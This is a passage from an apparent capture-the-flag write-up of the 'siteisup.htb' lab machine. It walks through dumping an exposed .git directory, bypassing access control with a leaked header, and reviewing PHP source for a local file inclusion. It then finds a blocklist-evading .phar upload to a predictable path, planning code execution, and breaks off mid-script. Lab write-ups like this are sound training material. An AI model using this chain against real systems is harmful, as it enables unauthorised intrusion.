+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Fetching<span class="w"> </span>http://siteisup.htb/dev/.git/refs/tags/<span class="w"> </span><span class="o">[</span><span class="m">200</span><span class="o">]</span>
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Fetching<span class="w"> </span>http://siteisup.htb/dev/.git/objects/info/<span class="w"> </span><span class="o">[</span><span class="m">200</span><span class="o">]</span>
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Fetching<span class="w"> </span>http://siteisup.htb/dev/.git/objects/pack/<span class="w"> </span><span class="o">[</span><span class="m">200</span><span class="o">]</span>
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Fetching<span class="w"> </span>http://siteisup.htb/dev/.git/refs/heads/main<span class="w"> </span><span class="o">[</span><span class="m">200</span><span class="o">]</span>
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Fetching<span class="w"> </span>http://siteisup.htb/dev/.git/refs/remotes/origin/<span class="w"> </span><span class="o">[</span><span class="m">200</span><span class="o">]</span>
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Fetching<span class="w"> </span>http://siteisup.htb/dev/.git/objects/pack/pack-30e4e40cb7b0c696d1ce3a83a6725267d45715da.idx<span class="w"> </span><span class="o">[</span><span class="m">200</span><span class="o">]</span>
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Fetching<span class="w"> </span>http://siteisup.htb/dev/.git/objects/pack/pack-30e4e40cb7b0c696d1ce3a83a6725267d45715da.pack<span class="w"> </span><span class="o">[</span><span class="m">200</span><span class="o">]</span>
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Fetching<span class="w"> </span>http://siteisup.htb/dev/.git/refs/remotes/origin/HEAD<span class="w"> </span><span class="o">[</span><span class="m">200</span><span class="o">]</span>
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Fetching<span class="w"> </span>http://siteisup.htb/dev/.git/logs/<span class="w"> </span><span class="o">[</span><span class="m">200</span><span class="o">]</span>
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Fetching<span class="w"> </span>http://siteisup.htb/dev/.git/logs/refs/<span class="w"> </span><span class="o">[</span><span class="m">200</span><span class="o">]</span>
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Fetching<span class="w"> </span>http://siteisup.htb/dev/.git/logs/HEAD<span class="w"> </span><span class="o">[</span><span class="m">200</span><span class="o">]</span>
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Fetching<span class="w"> </span>http://siteisup.htb/dev/.git/logs/refs/remotes/<span class="w"> </span><span class="o">[</span><span class="m">200</span><span class="o">]</span>
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Fetching<span class="w"> </span>http://siteisup.htb/dev/.git/logs/refs/heads/<span class="w"> </span><span class="o">[</span><span class="m">200</span><span class="o">]</span>
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Fetching<span class="w"> </span>http://siteisup.htb/dev/.git/logs/refs/remotes/origin/<span class="w"> </span><span class="o">[</span><span class="m">200</span><span class="o">]</span>
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Fetching<span class="w"> </span>http://siteisup.htb/dev/.git/logs/refs/heads/main<span class="w"> </span><span class="o">[</span><span class="m">200</span><span class="o">]</span>
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Fetching<span class="w"> </span>http://siteisup.htb/dev/.git/logs/refs/remotes/origin/HEAD<span class="w"> </span><span class="o">[</span><span class="m">200</span><span class="o">]</span>
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Running<span class="w"> </span>git<span class="w"> </span>checkout<span class="w"> </span>.
+Updated<span class="w"> </span><span class="m">6</span><span class="w"> </span>paths<span class="w"> </span>from<span class="w"> </span>the<span class="w"> </span>dex
+</pre></div>
+</div>
+<p>And now we can start perusing through the source and the git logs</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>git<span class="w"> </span>log<span class="w"> </span>--oneline
+010dcc3<span class="w"> </span><span class="o">(</span>HEAD<span class="w"> </span>-&gt;<span class="w"> </span>main,<span class="w"> </span>origin/main,<span class="w"> </span>origin/HEAD<span class="o">)</span><span class="w"> </span>Delete<span class="w"> </span>index.php
+c8fcc40<span class="w"> </span>Update<span class="w"> </span>checker.php
+f67efd0<span class="w"> </span>Create<span class="w"> </span>checker.php
+ab9bc16<span class="w"> </span>Update<span class="w"> </span>changelog.txt
+60d2b32<span class="w"> </span>Create<span class="w"> </span>admin.php
+c1998f8<span class="w"> </span>Add<span class="w"> </span>admin<span class="w"> </span>panel.
+35a3801<span class="w"> </span>Update<span class="w"> </span>changelog.txt
+57af03b<span class="w"> </span>Create<span class="w"> </span>index.php
+354fe06<span class="w"> </span>Delete<span class="w"> </span>.htpasswd
+<span class="m">8812785</span><span class="w"> </span>New<span class="w"> </span>technique<span class="w"> </span><span class="k">in</span><span class="w"> </span>header<span class="w"> </span>to<span class="w"> </span>protect<span class="w"> </span>our<span class="w"> </span>dev<span class="w"> </span>vhost.
+bc4ba79<span class="w"> </span>Update<span class="w"> </span>.htaccess
+61e5cc0<span class="w"> </span>Update<span class="w"> </span>index.php
+3d66cd4<span class="w"> </span>Create<span class="w"> </span>changelog.txt
+4fb1927<span class="w"> </span>Create<span class="w"> </span>stylesheet.css
+6f89af7<span class="w"> </span>Create<span class="w"> </span>index.php
+8d1beb1<span class="w"> </span>Create<span class="w"> </span>.htpasswd
+6ddcc7a<span class="w"> </span>Create<span class="w"> </span>.htaccess
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>git<span class="w"> </span>show<span class="w"> </span><span class="m">8812785</span>~<span class="w"> </span>
+commit<span class="w"> </span>bc4ba79e596e9fd98f1b2837b9bd3548d04fe7ab
+Author:<span class="w"> </span>Abdou.Y<span class="w"> </span>&lt;<span class="m">84577967</span>+ab2pentest@users.noreply.github.com&gt;
+Date:<span class="w">   </span>Wed<span class="w"> </span>Oct<span class="w"> </span><span class="m">20</span><span class="w"> </span><span class="m">16</span>:37:20<span class="w"> </span><span class="m">2021</span><span class="w"> </span>+0200
+
+<span class="w">    </span>Update<span class="w"> </span>.htaccess
+
+<span class="w">    </span>New<span class="w"> </span>technique<span class="w"> </span><span class="k">in</span><span class="w"> </span>header<span class="w"> </span>to<span class="w"> </span>protect<span class="w"> </span>our<span class="w"> </span>dev<span class="w"> </span>vhost.
+
+diff<span class="w"> </span>--git<span class="w"> </span>a/.htaccess<span class="w"> </span>b/.htaccess
+index<span class="w"> </span><span class="m">3190432</span>..44ff240<span class="w"> </span><span class="m">100644</span>
+---<span class="w"> </span>a/.htaccess
++++<span class="w"> </span>b/.htaccess
+@@<span class="w"> </span>-1,5<span class="w"> </span>+1,4<span class="w"> </span>@@
+-AuthType<span class="w"> </span>Basic
+-AuthUserFile<span class="w"> </span>/var/www/dev/.htpasswd
+-AuthName<span class="w"> </span><span class="s2">&quot;Remote Access Denied&quot;</span>
+-Require<span class="w"> </span>ip<span class="w"> </span><span class="m">127</span>.0.0.1<span class="w"> </span>::1
+-Require<span class="w"> </span>valid-user
++SetEnvIfNoCase<span class="w"> </span>Special-Dev<span class="w"> </span><span class="s2">&quot;only4dev&quot;</span><span class="w"> </span>Required-Header
++Order<span class="w"> </span>Deny,Allow
++Deny<span class="w"> </span>from<span class="w"> </span>All
++Allow<span class="w"> </span>from<span class="w"> </span><span class="nv">env</span><span class="o">=</span>Required-Header
+</pre></div>
+</div>
+<p>So as explained in the commit we can use that header to get 200 on the dev vhost</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-si<span class="w"> </span>http://dev.siteisup.htb<span class="p">|</span>head<span class="w"> </span>-1
+HTTP/1.1<span class="w"> </span><span class="m">403</span><span class="w"> </span>Forbidden
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-siH<span class="w"> </span><span class="s2">&quot;Special-Dev: only4dev&quot;</span><span class="w"> </span>http://dev.siteisup.htb<span class="p">|</span>head<span class="w"> </span>-1
+HTTP/1.1<span class="w"> </span><span class="m">200</span><span class="w"> </span>OK
+</pre></div>
+</div>
+<p>Lets setup Burp to add that header on all requests for us:<br />
+<img alt="header.png" src="../../../../_images/header.png" /></p>
+<p>And we now have access to the dev vhost, that’s a similar app to the main one, but we can scan lists of hosts instead of just one</p>
+<p>scanning further</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>dirsearch<span class="w"> </span>-u<span class="w"> </span>http://dev.siteisup.htb<span class="w"> </span>-r<span class="w"> </span>-x<span class="w"> </span><span class="m">403</span><span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Special-Dev: only4dev&quot;</span>
+
+<span class="w">  </span>_<span class="p">|</span>.<span class="w"> </span>_<span class="w"> </span>_<span class="w">  </span>_<span class="w">  </span>_<span class="w">  </span>_<span class="w"> </span>_<span class="p">|</span>_<span class="w">    </span>v0.4.2
+<span class="w"> </span><span class="o">(</span>_<span class="o">||</span><span class="p">|</span><span class="w"> </span>_<span class="o">)</span><span class="w"> </span><span class="o">(</span>/_<span class="o">(</span>_<span class="o">||</span><span class="w"> </span><span class="o">(</span>_<span class="p">|</span><span class="w"> </span><span class="o">)</span>
+
+Extensions:<span class="w"> </span>php,<span class="w"> </span>aspx,<span class="w"> </span>jsp,<span class="w"> </span>html,<span class="w"> </span>js<span class="w"> </span><span class="p">|</span><span class="w"> </span>HTTP<span class="w"> </span>method:<span class="w"> </span>GET<span class="w"> </span><span class="p">|</span><span class="w"> </span>Threads:<span class="w"> </span><span class="m">30</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Wordlist<span class="w"> </span>size:<span class="w"> </span><span class="m">10927</span>
+
+Output<span class="w"> </span>File:<span class="w"> </span>/home/blnkn/.dirsearch/reports/dev.siteisup.htb/_22-10-29_17-24-39.txt
+
+Error<span class="w"> </span>Log:<span class="w"> </span>/home/blnkn/.dirsearch/logs/errors-22-10-29_17-24-39.log
+
+Target:<span class="w"> </span>http://dev.siteisup.htb/
+
+<span class="o">[</span><span class="m">17</span>:24:39<span class="o">]</span><span class="w"> </span>Starting:
+<span class="o">[</span><span class="m">17</span>:24:45<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">    </span>0B<span class="w">  </span>-<span class="w"> </span>/admin.php
+<span class="o">[</span><span class="m">17</span>:24:52<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">    </span>1KB<span class="w"> </span>-<span class="w"> </span>/index.php
+<span class="o">[</span><span class="m">17</span>:24:52<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">    </span>1KB<span class="w"> </span>-<span class="w"> </span>/index.php/login/<span class="w">     </span><span class="o">(</span>Added<span class="w"> </span>to<span class="w"> </span>queue<span class="o">)</span>
+<span class="o">[</span><span class="m">17</span>:25:01<span class="o">]</span><span class="w"> </span><span class="m">301</span><span class="w"> </span>-<span class="w">  </span>322B<span class="w">  </span>-<span class="w"> </span>/uploads<span class="w">  </span>-&gt;<span class="w">  </span>http://dev.siteisup.htb/uploads/<span class="w">     </span><span class="o">(</span>Added<span class="w"> </span>to<span class="w"> </span>queue<span class="o">)</span>
+<span class="o">[</span><span class="m">17</span>:25:01<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">  </span>747B<span class="w">  </span>-<span class="w"> </span>/uploads/
+<span class="o">[</span><span class="m">17</span>:25:03<span class="o">]</span><span class="w"> </span>Starting:<span class="w"> </span>index.php/login/
+<span class="o">[</span><span class="m">17</span>:25:33<span class="o">]</span><span class="w"> </span>Starting:<span class="w"> </span>uploads/
+
+Task<span class="w"> </span>Completed
+</pre></div>
+</div>
+</section>
+<section id="source-code-review">
+<h2>Source code Review<a class="headerlink" href="#source-code-review" title="Permalink to this heading">#</a></h2>
+<p>index.php is pretty simple and, basically lets us run any php files as long as there’s no bin /usr and so on, this might come handy if we figure out a way to upload a php webshell.</p>
+<div class="highlight-php notranslate"><div class="highlight"><pre><span></span><span class="x">&lt;b&gt;This is only for developers&lt;/b&gt;</span>
+<span class="x">&lt;br&gt;</span>
+<span class="x">&lt;a href=&quot;?page=admin&quot;&gt;Admin Panel&lt;/a&gt;</span>
+<span class="cp">&lt;?php</span>
+        <span class="nb">define</span><span class="p">(</span><span class="s2">&quot;DIRECTACCESS&quot;</span><span class="p">,</span><span class="k">false</span><span class="p">);</span>
+        <span class="nv">$page</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">];</span>
+        <span class="k">if</span><span class="p">(</span><span class="nv">$page</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">&quot;/bin|usr|home|var|etc/i&quot;</span><span class="p">,</span><span class="nv">$page</span><span class="p">)){</span>
+                <span class="k">include</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;.php&quot;</span><span class="p">);</span>
+        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+                <span class="k">include</span><span class="p">(</span><span class="s2">&quot;checker.php&quot;</span><span class="p">);</span>
+        <span class="p">}</span>
+<span class="cp">?&gt;</span>
+</pre></div>
+</div>
+<p>the admin.php that is linked at the top does nothing at this stage</p>
+<div class="highlight-php notranslate"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="k">if</span><span class="p">(</span><span class="nx">DIRECTACCESS</span><span class="p">){</span>
+        <span class="k">die</span><span class="p">(</span><span class="s2">&quot;Access Denied&quot;</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="c1">#ToDo</span>
+<span class="cp">?&gt;</span>
+</pre></div>
+</div>
+<p>The changelog seems to coroborate that, and also mentions an upload feature, just what we need.</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Beta</span> <span class="n">version</span>
+
+<span class="mi">1</span><span class="o">-</span> <span class="n">Check</span> <span class="n">a</span> <span class="n">bunch</span> <span class="n">of</span> <span class="n">websites</span><span class="o">.</span>
+
+<span class="o">--</span> <span class="n">ToDo</span><span class="p">:</span>
+
+<span class="mi">1</span><span class="o">-</span> <span class="n">Multithreading</span> <span class="k">for</span> <span class="n">a</span> <span class="n">faster</span> <span class="n">version</span> <span class="p">:</span><span class="n">D</span><span class="o">.</span>
+<span class="mi">2</span><span class="o">-</span> <span class="n">Remove</span> <span class="n">the</span> <span class="n">upload</span> <span class="n">option</span><span class="o">.</span>
+<span class="mi">3</span><span class="o">-</span> <span class="n">New</span> <span class="n">admin</span> <span class="n">panel</span><span class="o">.</span>
+</pre></div>
+</div>
+<p>So the meat of this web app is checkers.php, lets have a look under the hood.</p>
+<p>checking the special header, like everywhere else</p>
+<div class="highlight-php notranslate"><div class="highlight"><pre><span></span><span class="x">if(DIRECTACCESS){</span>
+<span class="x">        die(&quot;Access Denied&quot;);</span>
+<span class="x">}</span>
+</pre></div>
+</div>
+<p><a class="reference external" href="https://www.php.net/manual/en/function.trim.php">https://www.php.net/manual/en/function.trim.php</a> - trim is kinda like python strip()<br />
+<a class="reference external" href="https://www.php.net/manual/en/function.curl-exec.php">https://www.php.net/manual/en/function.curl-exec.php</a>  - it’s in the name<br />
+The function at the very top builds the http query with php <code class="docutils literal notranslate"><span class="pre">curl_init</span></code> then does the request with <code class="docutils literal notranslate"><span class="pre">curl_exec</span></code> and closes it with <code class="docutils literal notranslate"><span class="pre">curl_close</span></code> if the curl returns 200 the function returns an array of true, and the data of the curl, else it returns false</p>
+<div class="highlight-php notranslate"><div class="highlight"><pre><span></span><span class="x">function isitup($url){</span>
+<span class="x">        $ch=curl_init();</span>
+<span class="x">        curl_setopt($ch, CURLOPT_URL, trim($url));</span>
+<span class="x">        curl_setopt($ch, CURLOPT_USERAGENT, &quot;siteisup.htb beta&quot;);</span>
+<span class="x">        curl_setopt($ch, CURLOPT_HEADER, 1);</span>
+<span class="x">        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span>
+<span class="x">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span>
+<span class="x">        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);</span>
+<span class="x">        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);</span>
+<span class="x">        curl_setopt($ch, CURLOPT_TIMEOUT, 30);</span>
+<span class="x">        $f = curl_exec($ch);</span>
+<span class="x">        $header = curl_getinfo($ch);</span>
+<span class="x">        if($f AND $header[&#39;http_code&#39;] == 200){</span>
+<span class="x">                return array(true,$f);</span>
+<span class="x">        }else{</span>
+<span class="x">                return false;</span>
+<span class="x">        }</span>
+<span class="x">    curl_close($ch);</span>
+<span class="x">}</span>
+</pre></div>
+</div>
+<p>There’s another function at the very bottom, this uses <code class="docutils literal notranslate"><span class="pre">strrpos</span></code> string position, to find the dot in the filename and extract the extension out of it.
+<a class="reference external" href="https://www.php.net/manual/en/function.strrpos.php">https://www.php.net/manual/en/function.strrpos.php</a></p>
+<div class="highlight-php notranslate"><div class="highlight"><pre><span></span><span class="x">function getExtension($file) {</span>
+<span class="x">        $extension = strrpos($file,&quot;.&quot;);</span>
+<span class="x">        return ($extension===false) ? &quot;&quot; : substr($file,$extension+1);</span>
+<span class="x">}</span>
+</pre></div>
+</div>
+<p>This html form sends a multipart/form-data with 2 fields, one named file of type file, where our file is the host list and size 50, one named check type submit and value Check</p>
+<div class="highlight-html notranslate"><div class="highlight"><pre><span></span>        <span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;post&quot;</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&quot;multipart/form-data&quot;</span><span class="p">&gt;</span>
+                            <span class="p">&lt;</span><span class="nt">label</span><span class="p">&gt;</span>List of websites to check:<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
+                                <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;file&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;file&quot;</span> <span class="na">size</span><span class="o">=</span><span class="s">&quot;50&quot;</span><span class="p">&gt;</span>
+                                <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;check&quot;</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;submit&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;Check&quot;</span><span class="p">&gt;</span>
+                <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</pre></div>
+</div>
+<p>So the form would look something like this:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">POST</span> <span class="o">/</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+<span class="n">Host</span><span class="p">:</span> <span class="n">dev</span><span class="o">.</span><span class="n">siteisup</span><span class="o">.</span><span class="n">htb</span>
+<span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span> <span class="n">Mozilla</span><span class="o">/</span><span class="mf">5.0</span> <span class="p">(</span><span class="n">X11</span><span class="p">;</span> <span class="n">Linux</span> <span class="n">aarch64</span><span class="p">;</span> <span class="n">rv</span><span class="p">:</span><span class="mf">102.0</span><span class="p">)</span> <span class="n">Gecko</span><span class="o">/</span><span class="mi">20100101</span> <span class="n">Firefox</span><span class="o">/</span><span class="mf">102.0</span>
+<span class="n">Accept</span><span class="p">:</span> <span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xhtml</span><span class="o">+</span><span class="n">xml</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xml</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="n">image</span><span class="o">/</span><span class="n">avif</span><span class="p">,</span><span class="n">image</span><span class="o">/</span><span class="n">webp</span><span class="p">,</span><span class="o">*/*</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.8</span>
+<span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="p">:</span> <span class="n">en</span><span class="o">-</span><span class="n">US</span><span class="p">,</span><span class="n">en</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.5</span>
+<span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span> <span class="n">gzip</span><span class="p">,</span> <span class="n">deflate</span>
+<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">multipart</span><span class="o">/</span><span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span> <span class="n">boundary</span><span class="o">=---------------------------</span><span class="mi">3067420814402721157379576655</span>
+<span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span> <span class="mi">492</span>
+<span class="n">Origin</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">dev</span><span class="o">.</span><span class="n">siteisup</span><span class="o">.</span><span class="n">htb</span>
+<span class="n">Connection</span><span class="p">:</span> <span class="n">close</span>
+<span class="n">Referer</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">dev</span><span class="o">.</span><span class="n">siteisup</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span>
+<span class="n">Upgrade</span><span class="o">-</span><span class="n">Insecure</span><span class="o">-</span><span class="n">Requests</span><span class="p">:</span> <span class="mi">1</span>
+
+<span class="o">-----------------------------</span><span class="mi">3067420814402721157379576655</span>
+<span class="n">Content</span><span class="o">-</span><span class="n">Disposition</span><span class="p">:</span> <span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&quot;file&quot;</span><span class="p">;</span> <span class="n">filename</span><span class="o">=</span><span class="s2">&quot;list.txt&quot;</span>
+<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">text</span><span class="o">/</span><span class="n">plain</span>
+
+<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">127.0.0.1</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">php</span>
+<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">127.0.0.1</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">php</span>
+<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">127.0.0.1</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">php</span>
+<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">127.0.0.1</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">php</span>
+<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">127.0.0.1</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">php</span>
+<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">127.0.0.1</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">php</span>
+
+<span class="o">-----------------------------</span><span class="mi">3067420814402721157379576655</span>
+<span class="n">Content</span><span class="o">-</span><span class="n">Disposition</span><span class="p">:</span> <span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&quot;check&quot;</span>
+
+<span class="n">Check</span>
+<span class="o">-----------------------------</span><span class="mi">3067420814402721157379576655</span><span class="o">--</span>
+</pre></div>
+</div>
+<p><a class="reference external" href="https://www.php.net/manual/en/function.preg-match.php">https://www.php.net/manual/en/function.preg-match.php</a> - perform regex match<br />
+<a class="reference external" href="https://www.php.net/manual/en/function.md5.php">https://www.php.net/manual/en/function.md5.php</a> - make md5 digest<br />
+<a class="reference external" href="https://www.php.net/manual/en/function.time.php">https://www.php.net/manual/en/function.time.php</a> - get time</p>
+<p>If there’s a <code class="docutils literal notranslate"><span class="pre">check</span></code> item in the form proceed,<br />
+Check if the file with name <code class="docutils literal notranslate"><span class="pre">file</span></code> is &gt; 10kb, and die if it isn’t<br />
+Get the filename of the file named <code class="docutils literal notranslate"><span class="pre">file</span></code> and store in a variable.<br />
+Extract the extension with the getExtension function we read earlier, and regex match against that list of disallowed extensions, and die if it matches.</p>
+<p>Maybe allowing just one specific type of extension would have been a better choice here, since there’s probably gonna be a way to escape the extension check, or just use one that isn’t specifically denied, like phar.</p>
+<p>Create a dir in uploads which is an md5 digest of the current time, so, this is predictable, if it doesn’t already exist create it with 770 permitions</p>
+<div class="highlight-php notranslate"><div class="highlight"><pre><span></span><span class="x">if($_POST[&#39;check&#39;]){</span>
+
+<span class="x">        # File size must be less than 10kb.</span>
+<span class="x">        if ($_FILES[&#39;file&#39;][&#39;size&#39;] &gt; 10000) {</span>
+<span class="x">        die(&quot;File too large!&quot;);</span>
+<span class="x">    }</span>
+<span class="x">        $file = $_FILES[&#39;file&#39;][&#39;name&#39;];</span>
+
+<span class="x">        # Check if extension is allowed.</span>
+<span class="x">        $ext = getExtension($file);</span>
+<span class="x">        if(preg_match(&quot;/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i&quot;,$ext)){</span>
+<span class="x">                die(&quot;Extension not allowed!&quot;);</span>
+<span class="x">        }</span>
+
+<span class="x">        # Create directory to upload our file.</span>
+<span class="x">        $dir = &quot;uploads/&quot;.md5(time()).&quot;/&quot;;</span>
+<span class="x">        if(!is_dir($dir)){</span>
+<span class="x">        mkdir($dir, 0770, true);</span>
+<span class="x">    }</span>
+</pre></div>
+</div>
+<p><a class="reference external" href="https://www.php.net/manual/en/function.move-uploaded-file.php">https://www.php.net/manual/en/function.move-uploaded-file.php</a> - move uploaded file to new location<br />
+<a class="reference external" href="https://www.php.net/manual/en/features.file-upload.post-method.php">https://www.php.net/manual/en/features.file-upload.post-method.php</a> - definition of the <code class="docutils literal notranslate"><span class="pre">$_FILE</span></code> Array<br />
+<a class="reference external" href="https://www.php.net/manual/en/reserved.variables.files.php">https://www.php.net/manual/en/reserved.variables.files.php</a> - <code class="docutils literal notranslate"><span class="pre">$_FILE</span></code><br />
+The final path is guessable as it’s: <code class="docutils literal notranslate"><span class="pre">/upload/md5_of_upload_time/originalfilename</span></code> since the file variable is taken from the superglobal <code class="docutils literal notranslate"><span class="pre">$_FILE</span></code> and is the provided filename</p>
+<div class="highlight-php notranslate"><div class="highlight"><pre><span></span><span class="x">  # Upload the file.</span>
+<span class="x">        $final_path = $dir.$file;</span>
+<span class="x">        move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], &quot;{$final_path}&quot;);</span>
+</pre></div>
+</div>
+<p><a class="reference external" href="https://www.php.net/manual/en/function.explode.php">https://www.php.net/manual/en/function.explode.php</a> - like python split()<br />
+<a class="reference external" href="https://www.php.net/manual/en/function.file-get-contents.php">https://www.php.net/manual/en/function.file-get-contents.php</a> - read file into a string<br />
+Read the file from new location, and explode at “\n”, into an array called websites<br />
+Start to iterate through the array<br />
+Trim newlines and spaces for the address<br />
+If it did not find regex matches for file:// data:// or ftp:// in the address, proceed, else tell the user that he’s a fithy Hecker.<br />
+Run the isitup() func on the site address, and say if its up or down depending on what isitup() returned</p>
+<div class="highlight-php notranslate"><div class="highlight"><pre><span></span><span class="x">  # Read the uploaded file.</span>
+<span class="x">        $websites = explode(&quot;\n&quot;,file_get_contents($final_path));</span>
+
+<span class="x">        foreach($websites as $site){</span>
+<span class="x">                $site=trim($site);</span>
+<span class="x">                if(!preg_match(&quot;#file://#i&quot;,$site) &amp;&amp; !preg_match(&quot;#data://#i&quot;,$site) &amp;&amp; !preg_match(&quot;#ftp://#i&quot;,$site)){</span>
+<span class="x">                        $check=isitup($site);</span>
+<span class="x">                        if($check){</span>
+<span class="x">                                echo &quot;&lt;center&gt;{$site}&lt;br&gt;&lt;font color=&#39;green&#39;&gt;is up ^_^&lt;/font&gt;&lt;/center&gt;&quot;;</span>
+<span class="x">                        }else{</span>
+<span class="x">                                echo &quot;&lt;center&gt;{$site}&lt;br&gt;&lt;font color=&#39;red&#39;&gt;seems to be down :(&lt;/font&gt;&lt;/center&gt;&quot;;</span>
+<span class="x">                        }</span>
+<span class="x">                }else{</span>
+<span class="x">                        echo &quot;&lt;center&gt;&lt;font color=&#39;red&#39;&gt;Hacking attempt was detected !&lt;/font&gt;&lt;/center&gt;&quot;;</span>
+<span class="x">                }</span>
+<span class="x">        }</span>
+</pre></div>
+</div>
+<p>Cool, so maybe we can upload a phar that does things we want, figure out the actual location by making a md5 of time ourselves, and run that with the admin page LFI.</p>
+</section>
+<section id="from-file-upload-filter-evasion-and-predictable-upload-path-to-rce">
+<h2>From file upload filter evasion and predictable upload path to RCE<a class="headerlink" href="#from-file-upload-filter-evasion-and-predictable-upload-path-to-rce" title="Permalink to this heading">#</a></h2>
+<p>We’ll start by trying to run a trivial phpinfo() to se if our idea works, and to get more information on the server</p>
+<div class="highlight-php notranslate"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="nb">phpinfo</span><span class="p">()</span>
+<span class="cp">?&gt;</span>
+</pre></div>
+</div>
+<p>php time() gives epoch, and it does not go smaller than seconds, or at least not without arguments, so, we can generate the md5 based path every seconds, let’s have that running on our machine as we upload our phar on the server.</p>
+<div class="highlight-php notranslate"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="k">while</span><span class="p">(</span><span class="k">true</span><span class="p">){</span>
